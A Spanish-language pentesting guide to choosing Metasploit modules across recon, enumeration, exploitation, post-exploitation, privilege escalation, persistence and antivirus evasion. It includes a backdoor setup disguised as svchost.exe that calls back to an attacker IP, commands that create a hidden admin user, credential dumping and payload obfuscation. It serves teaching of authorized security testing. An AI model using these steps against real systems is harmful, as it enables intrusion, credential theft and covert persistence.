# Metodologia de seleccion de modulos
En un **proceso completo de pentesting**, Metasploit Framework puede apoyar diversas fases: desde el reconocimiento inicial hasta la explotación de vulnerabilidades y las tareas posteriores. Aunque Metasploit es conocido principalmente por la fase de **explotación**, también incluye numerosos módulos para **recolección de información** y **post-explotación**. 
## Reconocimiento (Reconocimiento Pasivo)

En la fase de **reconocimiento**, el objetivo es recopilar información del objetivo sin interactuar directamente (o mínimamente) con él. Gran parte de este reconocimiento suele hacerse con técnicas OSINT y herramientas externas, pero Metasploit ofrece módulos **auxiliares (auxiliary)** orientados a la **recolección de información** que pueden ser útiles:

- **Búsqueda de información de dominio**: Por ejemplo, el módulo `auxiliary/gather/enum_dns` realiza consultas DNS (incluso intentos de transferencia de zona) para obtener registros de un dominio objetivo. Esto ayuda a mapear subdominios, direcciones IP y otros datos DNS relevantes del objetivo.
    
- **Recolección de correos electrónicos**: Metasploit cuenta con módulos que aprovechan motores de búsqueda para OSINT. Por ejemplo, `auxiliary/gather/search_email_collector` busca en Google, Bing y Yahoo listas de correos electrónicos asociados a un dominio objetivo. Este módulo puede ayudar a identificar cuentas de empleados para futuros ataques dirigidos (ingeniería social, phishing, etc.).
    
- **Whois y otros**: Existen módulos para consultas whois, información de registro en la nube, LDAP público, etc. (por ejemplo `auxiliary/gather/cloud_lookup` para datos en servicios cloud). Estos módulos **auxiliary/gather** pueden emplearse según convenga al contexto de la prueba, complementando las fuentes abiertas.
    

**Criterios de Selección en Reconocimiento:** Elija módulos de recolección según la información disponible del objetivo. Si tiene un **nombre de dominio**, utilice módulos de DNS y buscadores de correos. Si solo tiene direcciones IP, esta fase dependerá más de análisis de infraestructura (p. ej., buscar rangos asociados, información en bases de datos públicas) que de módulos Metasploit directamente. Considere que Metasploit no reemplaza las herramientas OSINT especializadas; úselo puntualmente cuando ofrezca un módulo adecuado para la información que busca.

## Escaneo y Enumeración (Reconocimiento Activo)

En la fase de **escaneo activo y enumeración**, se identifican los puertos abiertos, servicios en ejecución y detalles del sistema objetivo. Metasploit facilita esta etapa mediante módulos **auxiliares de tipo scanner** para distintos protocolos, además de poder integrarse con otras herramientas de escaneo:

- **Mapeo de puertos**: Puede emplearse `db_nmap` desde Metasploit para ejecutar Nmap y almacenar los resultados en la base de datos de Metasploit. Esto identifica rápidamente puertos abiertos y servicios, proporcionando una base para la enumeración con módulos correspondientes. _Ejemplo:_ `db_nmap -sV -A <objetivo>` para detección de puertos y versiones de servicios. Los hosts y puertos descubiertos quedan registrados para referencia durante la sesión.
    
- **Enumeración de servicios**: Por cada puerto/protocolo identificado, elija módulos auxiliares adecuados para **fingerprinting** y enumeración detallada. La siguiente tabla muestra ejemplos típicos:
    
    |Servicio/Puerto|Módulo auxiliar (scanner)|Función del módulo|
    |---|---|---|
    |**HTTP/HTTPS (80, 443)**|`auxiliary/scanner/http/http_version`|Detecta la versión del servidor web (ej. Apache, IIS).|
    |**FTP (21)**|`auxiliary/scanner/ftp/ftp_version`|Obtiene la versión del servicio FTP, confirmando por ejemplo si es vsftpd, ProFTPD, etc.|
    |**SMB (445)**|`auxiliary/scanner/smb/smb_version`|Interroga a SMB para obtener versión de protocolo y _sistema operativo remoto_ si es divulgada. Útil para detectar Windows sin parches conocidos (p.ej. vulnerabilidad **MS17-010**).|
    |**SMTP (25)**|`auxiliary/scanner/smtp/smtp_version` `auxiliary/scanner/smtp/smtp_enum`|Identifica el servidor de correo (banner de SMTP) y permite **enumerar usuarios válidos** mediante comandos SMTP VRFY, revelando cuentas existentes para posibles ataques de fuerza bruta.|
    |**SSH (22)**|`auxiliary/scanner/ssh/ssh_version`|Lee el banner de SSH para conocer versión de OpenSSH o implementaciones propietarias (indicando posibles vulnerabilidades o configuraciones débiles).|
    |**SNMP (161)**|`auxiliary/scanner/snmp/snmp_login`|Prueba credenciales (commmunity strings) por defecto en SNMP y permite enumerar información si la comunidad “public” está habilitada.|
    
    _Nota:_ Metasploit organiza los **módulos auxiliares** en categorías (subdirectorios) por protocolo o función (ej. _scanner/http/_, _scanner/smb/_, etc.), lo que ayuda a encontrar rápidamente módulos de enumeración para un puerto específico. Por ejemplo, en la consola puede usar `use auxiliary/scanner/ftp/` y luego presionar la tecla `Tab` para listar los módulos de FTP disponibles.
    
- **Bruteforce y autenticación**: Para servicios que requieran credenciales (SSH, FTP, SMB, etc.), considere módulos de **fuerza bruta** o de autenticación por diccionario: `auxiliary/scanner/ssh/ssh_login`, `auxiliary/scanner/ftp/ftp_login`, `auxiliary/scanner/smb/smb_login`, etc. Úselos con precaución para no bloquear cuentas o generar alertas (ver buenas prácticas más adelante). Siempre que se hayan enumerado usuarios válidos (por ejemplo vía smtp_enum o a través de OSINT), se pueden configurar estos módulos con listas de contraseñas comunes.
    

**Criterios de Selección en Escaneo/Enumeración:** Base su elección en los **puertos abiertos y servicios identificados**. Por ejemplo, ante un puerto 80, priorice módulos HTTP (detección de versión, **dir_listing**, **dir_scanner**, etc. como los usados en escenarios con Metasploitable). Si el objetivo es Windows y muestra recursos compartidos (445/TCP), use módulos SMB (versión, enumeración de usuarios/shares). Para cada servicio, revise la documentación (comando `info`) del módulo para asegurarse de que se adapta a la versión del servicio objetivo. La fase de enumeración exhaustiva sienta las bases para la explotación exitosa, ya que de aquí obtendrá versiones de software y posibles vulnerabilidades conocidas.

## Selección de Exploits (`search` e `info` en Metasploit)

Una vez identificados servicios y posibles vulnerabilidades, el siguiente paso es **seleccionar los módulos de explotación adecuados**. Metasploit facilita esta búsqueda gracias al comando `search`, que permite filtrar su extensa base de datos de exploits por distintos criterios:

- **Búsqueda por nombre o servicio:** Podemos buscar por nombre de software, protocolo o incluso cadena relacionada. Por ejemplo, si descubrimos un FTP _vsftpd 2.3.4_, podemos ejecutar `search vsftpd` para ver módulos relacionados. Del caso anterior, Metasploit ofrece un exploit para la versión 2.3.4 con backdoor conocido. De igual forma, `search struts` listaría exploits relacionados con Apache Struts (útil si un servidor web corre esa tecnología).
    
- **Búsqueda avanzada con filtros:** El comando `search` acepta **operadores** para afinar resultados. Algunos operadores comunes son:
    
    - `name`: buscar por nombre del módulo o vulnerabilidad (ej: `search name:ms17-010`).
        
    - `platform`: filtrar por plataforma objetivo (ej: `search platform:windows type:exploit` listará exploits para Windows).
        
    - `type`: filtrar por tipo de módulo (exploit, auxiliary, post, etc.).
        
    - `cve`: buscar por identificador CVE (ej: `search cve:2021-40444`).
        
    - _Ejemplo:_ `search type:exploit platform:unix vsftpd` buscaría exploits de tipo _exploit_ para sistemas Unix relacionados con “vsftpd”. Metasploit nos permite así **priorizar exploits relevantes** en base al contexto del objetivo.
        
- **Revisar información del módulo:** Una vez identificado un posible módulo con `search`, se carga con `use <ruta_del_modulo>` y luego es fundamental ejecutar `info`. El comando `info` muestra la descripción, opciones requeridas y notas del exploit. Allí veremos:
    
    - **Plataformas y sistemas operativos soportados** (por ejemplo, Windows x86/x64, versiones específicas de SO).
        
    - **Rank (Ranking)** del exploit – indica la fiabilidad/estabilidad del módulo (Excelente, Grande, Bueno, Normal, etc.).
        
    - **Opciones requeridas:** IP/host objetivo (`RHOSTS`), puerto (`RPORT`), payload por defecto, etc. Por ejemplo, `info` nos mostrará qué parámetros son _obligatorios_ (“Required: Yes”) y deben configurarse.
        
    - **Referencias** (CVE, exploitdb, etc.) para entender mejor la vulnerabilidad explotada.
        
- **Criterios según el contexto:** Al elegir un exploit, verifique que coincida con el **sistema operativo y versión de servicio** del objetivo. Por ejemplo, si la enumeración reveló un Windows 7 sin parche MS08-067 y con puerto 445 abierto, es candidato para usar el módulo `exploit/windows/smb/ms08_067_netapi`. Si se detectó un Apache Tomcat 7 vulnerable, buscaremos exploits `multi/http` relacionados con Tomcat. **Siempre elegir exploits que se alineen con la información recopilada** para aumentar la probabilidad de éxito y reducir intentos fallidos.
    
- **Ejemplos típicos de exploits:**
    
    - _Windows:_ `exploit/windows/smb/ms17_010_eternalblue` (explotación de SMBv1), `exploit/windows/http/bluekeep_rdp` (si RDP vulnerable), exploits locales en Windows (ver sección de escalada).
        
    - _Linux/Unix:_ `exploit/unix/ftp/vsftpd_234_backdoor` (backdoor en vsftpd 2.3.4), `exploit/multi/http/php_cgi_arg_injection` (vulnerabilidad CGI en servidores PHP antiguos), `exploit/linux/http/struts2_content_type_ognl` (Apache Struts2 RCE), etc.
        
    - _Aplicaciones web:_ Módulos en `exploit/multi/http/*` para CMS populares (Joomla, WordPress, Drupal, etc.), o scripts cgi (según tecnologías identificadas en el análisis).
        
    - _Dispositivos/otras plataformas:_ Metasploit también tiene exploits para routers, Android (`exploit/android/...`), etc. Si el contexto lo requiere (p.ej., pruebas de intrusión en entornos móviles o IoT), utilice `search platform:` correspondiente.
        

Antes de ejecutar un exploit, asegúrese de haber configurado los **opciones** requeridas (`RHOSTS`, `RPORT`, `TARGET` si es necesario, etc.) con `set`. Puede listar las opciones actuales con `show options` en cualquier momento. Recuerde que algunos exploits requieren ajustar el `TARGET` manualmente si la auto-detección no funciona – use `show targets` para listar los targets soportados y establezca aquel que coincida con el sistema objetivo.

## Explotación de Vulnerabilidades

Con el exploit apropiado seleccionado y configurado, se procede a la **ejecución de la explotación** para obtener acceso. Aquí se elige también un **payload** (carga útil) que se ejecutará en el sistema víctima tras explotar la vulnerabilidad. Por defecto, Metasploit suele asignar un payload estándar (ej. una shell reversa Meterpreter) adecuado al exploit, pero podemos cambiarlo con `set PAYLOAD`. Algunos puntos clave en esta fase:

- **Payloads comunes:** Los **Meterpreter** (ej. `windows/meterpreter/reverse_tcp`) son muy populares porque proveen una shell interactiva en memoria con multitud de funciones pos-explotación. Alternativamente, se pueden usar shells tradicionales (`cmd/sh` reverse shells, bind shells, etc.) según la situación. _Ejemplo:_ Para un objetivo Windows, `set PAYLOAD windows/meterpreter/reverse_tcp` luego de cargar el exploit, configurando `LHOST` (IP del atacante) y `LPORT` (puerto de escucha).
    
- **Lanzamiento del exploit:** Se utiliza el comando `run` o `exploit` para ejecutar el módulo cargado. Si todo va bien, deberíamos obtener una sesión en el sistema víctima (un prompt de Meterpreter, shell, etc.). _Ejemplo:_ tras explotar vsFTPd 2.3.4 obtuvimos un shell de sistema (sesión abierta); al explotar la vulnerabilidad PHP CGI en un servidor Apache obtuvimos una sesión Meterpreter.
    
- **Verificación de éxito:** Use `sessions -l` para listar sesiones activas y `sessions -i <id>` para interactuar con una sesión obtenida. Una vez dentro, puede ejecutar comandos de sistema o utilizar el potentísimo prompt de Meterpreter.
    

**Criterios en Explotación:** Priorice exploits con **alto ranking (fiabilidad)** y adecuados a la versión exacta del servicio. Si múltiples exploits están disponibles para una misma vulnerabilidad, revise en `info` la diferencia (algunos pueden ser versiones modificadas o con diferentes requerimientos). Por ejemplo, existen varios módulos para MS17-010 (EternalBlue) y suele preferirse el que tenga _Rank: Excelente_ o _Gran_ y que haya demostrado ser más estable. Metasploit asigna un **rank** a cada exploit según su confiabilidad y riesgo de impacto negativo – se recomienda escoger exploits con rank "Great" o "Excellent" para reducir la probabilidad de colgar o dañar el servicio objetivo. Incluso es posible filtrar por ranking en la búsqueda (`search -r great` para _Great o mejor_). Además, si no está seguro de que el objetivo sea vulnerable, use el comando **`check`** _cuando el módulo lo soporte_ para verificar la vulnerabilidad antes de explotar. Por ejemplo, con `ms08_067_netapi` se puede ejecutar `check` para confirmar si el sistema es vulnerable a esa falla. Esto ahorra tiempo y minimiza intentos innecesarios o _exploits_ fallidos que puedan apagar servicios.

## Post-Explotación

La fase de **post-explotación** inicia una vez obtenido acceso (shell o Meterpreter) en la máquina objetivo. El propósito es **expandir el acceso, recopilar información interna, mantener persistencia y preparar movimientos laterales**. Metasploit brilla en esta etapa mediante sus módulos **post** y comandos de Meterpreter:

- **Recopilación de información del sistema comprometido:** Es recomendable comenzar enumerando qué privilegios tenemos y qué tipo de sistema es (comando `sysinfo` en Meterpreter, `getuid`, etc.). Luego, usar módulos post para extraer información sensible:
    
    - **Credenciales y hashes:** Metasploit incluye módulos como `post/windows/gather/credential` (varios submódulos para extraer credenciales de Windows: hash de contraseñas LM/NTLM, credenciales guardadas, tokens de autenticación, etc.). Un ejemplo muy usado es **hashdump** – en Meterpreter se puede ejecutar el comando `hashdump` (para volcar hashes locales de Windows) o en Linux usar `post/linux/gather/hashdump` como en la explotación de vsFTPd donde obtuvimos `/etc/shadow`. También existen módulos para extraer claves SSH, volcados de memoria (mimikatz mediante extensión kiwi), historiales de comandos (`enum_users_history` en Linux), etc.
        
    - **Información de usuarios y red:** Módulos como `post/windows/gather/enum_logged_on_users` (usuarios logueados), `post/windows/gather/network_info` (configuración de red), o simplemente usar comandos internos (`ipconfig`, `netstat`) desde Meterpreter. En Linux, revisar `/etc/passwd`, `ifconfig`, etc., o usar módulos como el mencionado `enum_users_history`.
        
    - **Listado de software/parches:** Para evaluar potenciales movimientos o escaladas, podemos listar software instalado. Hay módulos post que enumeran programas instalados en Windows, servicios corriendo, parches faltantes, etc. (Ej: `post/windows/gather/enum_patches`).
        
    - **Captura de evidencias:** Metasploit permite **dumpear registros**, capturar pantallas (`screenshare` o `screenshot`), keyloggers (`keyscan_start` en Meterpreter o módulo `post/windows/capture/keylog_recorder`), grabar micrófono/webcam, etc., si el alcance lo permite.
        
- **Mejorar el acceso (upgrade a Meterpreter):** Si inicialmente obtuviste una shell básica (por ejemplo, a través de un exploit que abre cmd.exe), es aconsejable mejorarla a Meterpreter para disponer de más funcionalidades. Existe un módulo `post/multi/manage/shell_to_meterpreter` que intenta **migrar de shell a session meterpreter** en múltiples plataformas. También desde la shell se puede usar la opción `sessions -u <id>` para iniciar un exploit de upgrade.
    
- **Movimientos laterales y pivoting:** Con acceso a una máquina, puede intentar pivotar a otras en la red interna comprometida. Meterpreter ofrece el comando `run autoroute -s <red>` para enrutar tráfico a través de la sesión actual. Adicionalmente, se pueden usar módulos como `post/windows/manage/autoroute` o utilizar funciones de **port forwarding** (`portfwd`) para atacar otras máquinas a través de la sesión actual. Esto permite usar módulos de escaneo nuevamente, pero ahora ejecutados desde la máquina comprometida hacia otras máquinas internas.
    

**Criterios en Post-Explotación:** Priorice módulos post según sus objetivos. Si necesita **credenciales** para pivotar, comience con aquellos que extraen hashes o passwords. Si planea **escalar privilegios**, primero recopile información del sistema (versión de SO, parches) para elegir un exploit local adecuado. Mantenga la **opsec**: muchas acciones de post-explotación pueden generar logs (ej. extraer hashes toca el SAM en Windows, lo que a veces lanza eventos). Use técnicas como migrar a procesos críticos (p. ej., `migrate` a un proceso del sistema) para permanecer más oculto en memoria, y evite acciones innecesariamente ruidosas en sistemas en producción.

## Escalada de Privilegios

En muchos casos obtendremos inicialmente un acceso con privilegios limitados (por ejemplo, usuario estándar en lugar de _root/Administrador_). La **escalada de privilegios** consiste en aprovechar vulnerabilidades locales o configuraciones débiles para elevar nuestros privilegios en el sistema comprometido.

Metasploit ofrece numerosos módulos **post-explotación de escalada** categorizados por plataforma: `post/windows/escalate/*` y `post/linux/escalate/*`. La estrategia recomendada es:

- **Identificar la versión del SO y arquitectura:** comandos como `sysinfo` o módulos de recopilación le dan esta información (ej: Windows 10 x64 Build X, o kernel Linux versión X.Y). Con eso en mente, buscar exploits locales conocidos.
    
- **Usar un _exploit suggester_:** Metasploit tiene el módulo auxiliar **multi/recon/local_exploit_suggester** que inspecciona el sistema (debe proporcionarle la sesión Meterpreter) y lista posibles vulnerabilidades locales conocidas junto con módulos exploits correspondientes. Este _suggester_ ahorra tiempo, dando una lista de ataques de escalada aplicables según parches faltantes. _Ejemplo:_ tras comprometer un Windows 7 sin actualizar, el suggester podría indicar módulos como `post/windows/escalate/ms10_015_kitrap0d` (un exploit de escalada para Windows XP/7) o `ms16_032_secondary_logon_handle_privesc`, entre otros.
    
- **Ejecutar exploits locales:** Una vez elegido un exploit local, se carga con `use exploit/<...>` (estos se encuentran bajo _modules/exploit/_ usualmente con ruta _local_). Ejemplos concretos:
    
    - En Windows: `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` (aprovecha vulnerabilidad de Secondary Logon en Windows 7/2008), `exploit/windows/local/ms15_051_client_copy_image` (Windows 8.1/2012), `exploit/windows/local/juicy_kerberos_dc_sync` (si se tienen credenciales de dominio y se busca escalar a DC). También, Meterpreter ofrece el comando `getsystem` que intenta varias técnicas conocidas de escalada en Windows (token kidnapping, NamedPipe Impersonation, etc.) – es rápido probarlo aunque no garantiza éxito en sistemas modernos.
        
    - En Linux: exploits del kernel como Dirty Cow (`exploit/linux/local/dirtycow`), Overflow de polkit (`exploit/linux/local/polkit_priv_esc`), etc., dependiendo de la versión del kernel. Otra táctica en Linux es buscar credenciales en texto plano en archivos de configuración o en memoria (por ejemplo, _passwords_ de sudo en `/etc/sudoers` o procesos) en lugar de un exploit puro.
        
- **Verificar la estabilidad:** Los exploits de escalada pueden ser inestables; verifique en `info` su Ranking y notas. Cuando lo ejecute (`run`), compruebe con `getuid` o `whoami` si ahora tiene privilegios más altos. En caso exitoso, puede migrar el Meterpreter a un proceso con privilegios (ej: en Windows, migrar a _lsass.exe_ tras ser SYSTEM).
    

**Criterios en Escalada:** No todos los sistemas serán vulnerables a escalada; intente primero los métodos _“fáciles”_ (como credenciales reutilizadas, contraseñas de administrador obtenidas, o configuración de sudoers que permita algo). Solo después recurra a exploits de día-cero local. Utilice Metasploit como apoyo: a través de `search` con el nombre del SO o CVE específico. Siempre tenga en cuenta la versión exacta: un exploit local suele funcionar solo en rangos específicos de kernel o SO. Por ejemplo, un exploit de Windows 7 **no** funcionará en Windows 10; un exploit de Linux kernel 4.x puede crash un kernel 5.x. De nuevo, el módulo **Local Exploit Suggester** es valioso para minimizar prueba y error, sugiriendo exploits compatibles con el sistema objetivo.

## Persistencia

Una vez lograda la intrusión y potencialmente privilegios altos, un pentester debe evaluar mecanismos de **persistencia**, es decir, mantener acceso al sistema objetivo incluso si se reinicia o si se cierra la sesión actual. Esto simula técnicas de atacantes para **sobrevivir** más allá de la explotación inicial.

Metasploit ofrece varias opciones para establecer persistencia, especialmente en entornos Windows:

- **Módulos de persistencia en Windows:** Existe un conjunto de módulos bajo `post/windows/manage/` cuyo nombre inicia con _persistence_ (persistencia). Por ejemplo, `post/windows/manage/persistence_exe` permite instalar un ejecutable (_payload_) que se ejecutará en cada inicio del sistema. Dicho módulo usualmente:
    
    1. Toma un _payload_ Meterpreter (configurado con LHOST/LPORT del atacante) y lo copia en el sistema víctima.
        
    2. Crea una entrada en el registro o una tarea programada para ejecutar ese payload en cada reinicio, proporcionando una **puerta trasera** persistente.
        
    3. Opcionalmente puede ocultar/nombrar de forma inocua el payload en el sistema.
        
    
    _Ejemplo:_ Usando el módulo de persistencia:
    
    ```
    use post/windows/manage/persistence_exe
    set SESSION 1 (nuestra sesión Meterpreter actual)
    set LHOST <IP atacante>
    set LPORT 4444 
    set EXE_NAME "svchost.exe" (nombre camuflado)
    run
    ```
    
    Esto instalará el backdoor en la máquina objetivo. A partir de entonces, cada vez que arranque, intentará conectar de vuelta a `<IP atacante>:4444` otorgándonos una sesión.
    
- **Script de Meterpreter `persistence`:** Alternativamente, Metasploit incluye un script que se puede lanzar directamente desde Meterpreter con `run persistence` y opciones. Por ejemplo: `run persistence -U -X -p 4444 -r <IP>` crea una entrada de registro en **HKCU...Run** (-U indica user logon, -X indica al iniciar) para ejecutar un Meterpreter reverse TCP al puerto 4444. Este método es equivalente a los módulos anteriores, aunque los módulos más nuevos suelen dar más control.
    
- **Crear nuevos usuarios o puertas traseras alternativas:** Otra técnica de persistencia post-explotación es crear un usuario con privilegios altos en el sistema (ej.: `net user pentester <pass> /add` y `net localgroup administrators pentester /add` en Windows) para poder acceder más tarde vía RDP/SSH. Incluso hay módulos como `post/windows/manage/enable_rdp` que activan el Escritorio Remoto en Windows y ajustan el firewall para permitir acceso (luego uno puede autenticarse con las credenciales obtenidas o creadas). En sistemas Linux, puede agregarse una llave SSH al `~/.ssh/authorized_keys` de root o crear un cronjob que invoque una shell reversa periódicamente.
    
- **Persistencia en memoria vs. en disco:** Valorar si la persistencia será detectada. Un binario persistente en disco puede ser encontrado por antivirus o admins; una opción más sigilosa es usar _reflective DLL injection_ a través de algún servicio confiable, pero eso suele requerir técnicas fuera del alcance estándar de Metasploit. Para propósitos de pentest, documente siempre claramente cualquier puerta trasera agregada y quítela al finalizar.
    

**Criterios en Persistencia:** Determine si la persistencia forma parte del alcance (en pentesting con equipos de defensa, a veces se omite por riesgo). Si es así, elija método según el sistema:

- En **Windows**, los módulos de Metasploit simplifican la tarea (servicio, registro o tarea programada). Verifique contar con privilegios suficientes (ej.: privilegios de _SYSTEM_ para instalar servicios).
    
- En **Linux**, Metasploit no tiene módulos dedicados tan directos; se puede usar Meterpreter Linux para escribir un binario en `/etc/init.d/` o cron, pero generalmente se hace manualmente o con scripts personalizados. Un método multiplataforma es usar _Metasploit’s Persistence_ en script, pero requiere cuidado.
    
- **Mantener un perfil bajo:** Intente nombrar cualquier puerta trasera de forma que no llame la atención (imitando nombres del sistema) y colóquela en rutas típicas de sistema. Además, use **encoders o evasion** al generar payloads para evitar detección inmediata (ver buenas prácticas abajo).
    

## Buenas Prácticas para Eficiencia y Bajo Perfil

Al usar Metasploit, especialmente en entornos profesionales, es crucial **optimizar el tiempo** y **minimizar el ruido** que pueda alertar a defensas o producir resultados engañosos. A continuación, algunos consejos prácticos:

- **Planificación y foco:** No dispare módulos a ciegas. Use la información de reconocimiento para **focalizar** sus esfuerzos. Ejecutar todos los exploits posibles (modo “spray and pray”) genera mucho ruido en los logs y puede causar inestabilidad. En lugar de eso, **verifique primero la vulnerabilidad** con métodos suaves (por ejemplo, el comando `check` de un exploit, si está disponible, para confirmar que el objetivo es vulnerable antes de lanzar el payload). Esto reduce falsos positivos y evita explotar servicios no vulnerables innecesariamente.
    
- **Cuidado con los falsos positivos en scans:** Los **escáneres de vulnerabilidades** (incluyendo módulos auxiliares de Metasploit) pueden arrojar falsos positivos/negativos. Siempre que un módulo scanner reporte una vulnerabilidad, corrobórela – ya sea con otro módulo, manualmente o con otra herramienta. Por ejemplo, si `scanner/http/ssl_version` indica que SSL es débil, intente conectar manualmente o usar Nmap scripts para confirmarlo. No confíe ciegamente en un solo resultado.
    
- **Uso eficiente de la base de datos:** Metasploit permite mantener una base de datos interna con los comandos `workspace`, `hosts`, `services`, etc. Aproveche esto para **no repetir escaneos**. Importe resultados de Nmap (`db_import`) si ya los tiene, o use `db_nmap` para que todos los hallazgos queden registrados. Así puede consultar `services` para ver qué puertos/servicios tiene cada host sin tener que recordar o reescanear continuamente.
    
- **Módulos `search` y filtros:** Ya mencionado, pero enfocado a eficiencia: utilice operadores de búsqueda avanzada (platform, type, name, CVE) para **encontrar rápidamente el módulo** que necesita sin revisar largas listas manualmente. Esto ahorra tiempo valioso. Por ejemplo, si sabe un CVE específico del software objetivo, `search cve:XXXX-YYYY` le llevará directo al exploit, en lugar de buscar por nombre que puede variar.
    
- **Exploits de calidad y estabilidad:** Prefiera módulos con ranking **Excellent** o **Great** en Metasploit. Estos han sido probados para no colgar el servicio objetivo en la mayoría de casos, lo que significa menos riesgo de interrumpir operaciones del cliente durante la prueba. Puede configurar `setg MinimumRank great` globalmente para prevenir la ejecución accidental de exploits por debajo de _Great_. Esto fuerza a Metasploit a omitir exploits de baja confiabilidad a menos que los ejecute manualmente con `-f` (forzar). Limitarse a exploits confiables **agiliza** la explotación (menos intentos fallidos) y **reduce el ruido** (menos servicios caídos que puedan delatar que algo anda mal).
    
- **Evitar detección por antivirus/IDS:** Las cargas (_payloads_) de Metasploit más conocidas suelen detectarse por soluciones de seguridad modernas. Para minimizar esto:
    
    - Utilice **encoders** y técnicas de evasión al generar payloads. Metasploit incluye diversos _encoders_ (ver `msfvenom --list encoders`) que alteran la apariencia binaria del payload. Por ejemplo, usar `-e x86/shikata_ga_nai -i 3` en `msfvenom` aplica el encoder Shikata Ga Nai con 3 iteraciones, ofuscando la carga. Los _encoders_ modifican la payload para dificultar su detección por firmas antivirus, aunque _ojo_: no garantizan indetectabilidad, pero ayudan.
        
    - Pruebe los **módulos de evasion** si su versión de Metasploit los incluye (módulos en `modules/evasion/` que generan binarios AV-friendly).
        
    - Otra práctica es **personalizar** los payloads: Meterpreter es popular pero ampliamente reconocido por AV. En entornos con AV hostil, considere usar payloads menos estándar (por ejemplo, un **HTTPS reverse shell** en lugar de TCP, payloads meterpreter en _Python_ o _PowerShell_ que se ejecuten in-memory, etc.).
        
    - Siempre que sea posible, **ejecute en memoria**. Meterpreter de por sí reside en memoria (no escribe en disco), lo cual es bueno para no dejar rastro en el sistema de archivos. Si necesita ejecutar herramientas adicionales, intente cargarlas por Meterpreter (comando `upload` seguido de ejecución, y luego borrar) en lugar de dejarlas en el disco.
        
- **Manejo de contraseñas y fuerza bruta con cautela:** Al usar módulos de login/bruteforce, limite el número de intentos (`set PASS_FILE` con diccionarios razonables, `set USERPASS_FILE` si aplica, y ajuste `THREADS` acorde). Excesivos intentos fallidos pueden bloquear cuentas o generar alertas SIEM. Una buena práctica es probar primero credenciales por defecto o muy comunes antes de lanzar un diccionario grande.
    
- **Registro de actividades:** Use la consola de Metasploit con _spool_ a un archivo (`spool <log.txt>`) para registrar los comandos y resultados durante la sesión. Esto le ayuda a no perder información (por si la sesión se cierra) y posteriormente para el informe. Además, en operaciones largas, anotar qué módulos han sido probados evita repetir pasos (ahorrando tiempo).
    
- **Actualizar Metasploit regularmente:** Antes de la prueba, asegúrese de tener la última versión de Metasploit y sus módulos (`msfupdate`). Nuevos exploits se agregan constantemente. Usar una versión actualizada aumenta la eficiencia porque puede contener módulos para vulnerabilidades recientes que, de otro modo, tendría que explotar manualmente. Esto también reduce falsos negativos (módulos antiguos podrían no reconocer cierto software si no estaban actualizados).




